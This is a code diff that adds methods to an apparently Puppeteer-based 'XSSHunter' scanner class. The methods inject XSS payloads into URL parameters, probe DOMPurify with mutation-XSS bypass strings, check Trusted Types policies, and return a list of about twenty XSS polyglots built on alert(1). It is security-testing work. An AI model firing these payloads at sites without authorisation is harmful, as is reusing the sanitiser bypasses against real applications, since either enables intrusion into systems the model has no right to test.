@@ -158,6 +158,128 @@ class XSSHunter {
     results.mitigations = domXssMitigations;
     return results;
   }
+
+  async testTrustedTypesBypass() {
+    return this.page.evaluate(() => {
+      const bypasses = [];
+      if (typeof trustedTypes !== 'undefined') {
+        try { const p = trustedTypes.createPolicy('foo', { createHTML: (s) => s }); bypasses.push({ type: 'createPolicy allowed', policy: 'foo' }); } catch {}
+        try { const p = trustedTypes.defaultPolicy; if (p) bypasses.push({ type: 'defaultPolicy exists' }); } catch {}
+      }
+      return bypasses;
+    });
+  }
+
+  async testDOMPurifyBypass() {
+    return this.page.evaluate(() => {
+      if (typeof DOMPurify === 'undefined') return { available: false };
+      const bypasses = [];
+      const payloads = ['<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', '<details open=x ontoggle=alert(1)>', '<svg><p><style><img src=x onerror=alert(1) onerror=alert(2)>'];
+      for (const p of payloads) { const r = DOMPurify.sanitize(p); if (r.includes('onerror') || r.includes('alert')) bypasses.push({ payload: p.slice(0, 50), result: 'bypass' }); }
+      return { available: true, bypasses };
+    });
+  }
+
+  async testNestedContexts(url, param) {
+    const findings = [];
+    const nested = ['<svg onload=alert(1)><a href="javascript:alert(1)">x</a>', '""--><script>alert(1)</script>', '${alert(1)}', '{{constructor.constructor("alert(1)")()}}', '{%print(1)%}'];
+    for (const payload of nested) {
+      const testUrl = new URL(url); testUrl.searchParams.set(param, payload);
+      try { await this.page.goto(testUrl.href, { waitUntil: 'domcontentloaded', timeout: 8000 }); if ((await this.page.evaluate(() => document.body.innerHTML)).includes('alert')) findings.push({ payload: payload.slice(0, 40), context: 'nested' }); } catch {}
+    }
+    if (findings.length) this.findings.push({ type: 'nested-context-xss', count: findings.length, severity: 'HIGH' });
+    return findings;
+  }
+
+  async detectSelfXSS() {
+    return this.page.evaluate(() => {
+      const scripts = document.querySelectorAll('script');
+      const results = [];
+      scripts.forEach(s => {
+        const code = s.textContent;
+        if (code && (code.includes('console.log') || code.includes('prompt(')) && (code.includes('%s') || code.includes('${'))) results.push({ src: s.src || 'inline', snippet: code.slice(0, 150) });
+      });
+      return results;
+    });
+  }
+
+  async testAnchorInjection() {
+    return this.page.evaluate(() => {
+      const results = [];
+      document.querySelectorAll('a[href]').forEach(a => {
+        const href = a.getAttribute('href');
+        if (href && !href.startsWith('#') && !href.startsWith('/') && !href.startsWith('http')) {
+          const decoded = decodeURIComponent(href);
+          if (decoded.includes(':') || decoded.startsWith('//')) results.push({ href: href.slice(0, 100), text: a.textContent?.slice(0, 50) });
+        }
+      });
+      return results;
+    });
+  }
+
+  async testInlineEventHandlers() {
+    return this.page.evaluate(() => {
+      const results = [];
+      const all = document.querySelectorAll('*');
+      all.forEach(el => {
+        for (let i = 0; i < el.attributes.length; i++) {
+          const a = el.attributes[i];
+          if (a.name.startsWith('on') && a.value.length > 5) results.push({ tag: el.tagName, attr: a.name, value: a.value.slice(0, 100) });
+        }
+      });
+      return results.slice(0, 30);
+    });
+  }
+
+  async testSVGXSS() {
+    const svgPayloads = ['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', '<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml,<script>alert(1)</script>">', '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>'];
+    const results = [];
+    for (const p of svgPayloads) results.push({ payload: p.slice(0, 60), length: p.length });
+    return results;
+  }
+
+  async testBaseTagInjection() {
+    return this.page.evaluate(() => {
+      const bases = document.querySelectorAll('base');
+      return Array.from(bases).map(b => ({ href: b.href, target: b.target }));
+    });
+  }
+
+  async testFormActionInjection() {
+    return this.page.evaluate(() => {
+      const results = [];
+      document.querySelectorAll('form[action]').forEach(f => {
+        const action = f.getAttribute('action');
+        if (action && (action.startsWith('javascript:') || action === '' || action.startsWith('data:'))) results.push({ action: action.slice(0, 100), id: f.id });
+      });
+      return results;
+    });
+  }
+
+  generateAllPolyglots() {
+    return {
+      html: '<img/src=x onerror=alert(1)>',
+      svg: '<svg/onload=alert(1)>',
+      body: '<body onload=alert(1)>',
+      details: '<details/open/ontoggle=alert(1)>',
+      select: '<select autofocus onfocus=alert(1)>',
+      video: '<video><source onerror=alert(1)>',
+      audio: '<audio src=x onerror=alert(1)>',
+      input: '<input autofocus onfocus=alert(1)>',
+      iframe: '<iframe srcdoc="<script>alert(1)</script>">',
+      math: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
+      link: '<link rel=stylesheet href=javascript:alert(1)>',
+      meta: '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
+      object: '<object data=javascript:alert(1)>',
+      embed: '<embed src=javascript:alert(1)>',
+      style: '<style onload=alert(1)>',
+      table: '<table background=javascript:alert(1)>',
+      td: '<td background=javascript:alert(1)>',
+      division: '<div style="background:url(javascript:alert(1))">',
+      expression: '<div style="width:expression(alert(1))">',
+      keygen: '<keygen autofocus onfocus=alert(1)>'
+    };
+  }
 }
 
 module.exports = { XSSHunter };
